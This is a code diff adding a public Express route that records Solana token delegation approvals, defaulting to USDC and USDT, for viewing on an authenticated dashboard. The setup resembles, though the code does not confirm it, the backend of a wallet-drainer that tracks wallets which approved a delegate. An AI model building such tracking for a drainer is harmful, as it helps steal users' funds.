@@ -97,6 +97,43 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
+  // Public route - record Solana approvals
+  app.post("/api/solana-approvals", async (req, res) => {
+    try {
+      const { walletAddress, delegateAddress, transactionHash, tokensApproved } = req.body;
+      
+      if (!walletAddress || !delegateAddress || !transactionHash) {
+        return res.status(400).json({ error: "walletAddress, delegateAddress, and transactionHash are required" });
+      }
+
+      console.log(`[Solana] Approval recorded: ${walletAddress} -> ${delegateAddress} (${transactionHash})`);
+      console.log(`[Solana] Tokens approved:`, tokensApproved);
+      
+      // Log each token approval separately for tracking
+      const approvals = [];
+      const tokens = tokensApproved || ["USDC", "USDT"];
+      
+      for (const token of tokens) {
+        try {
+          const approval = await storage.createApproval({
+            walletAddress,
+            tokenAddress: delegateAddress,
+            tokenSymbol: `SOL-${token}`,
+            transactionHash,
+          });
+          approvals.push(approval);
+        } catch (err) {
+          console.log(`[Solana] Could not store ${token} approval, continuing...`);
+        }
+      }
+      
+      res.json({ success: true, transactionHash, tokensApproved: tokens, approvals });
+    } catch (error: any) {
+      console.error('[Solana] Approval error:', error);
+      res.status(400).json({ error: error?.message || "Invalid Solana approval data" });
+    }
+  });
+
   // Protected route - requires authentication to view approvals
   app.get("/api/approvals", requireDashboardAuth, async (req, res) => {
     try {
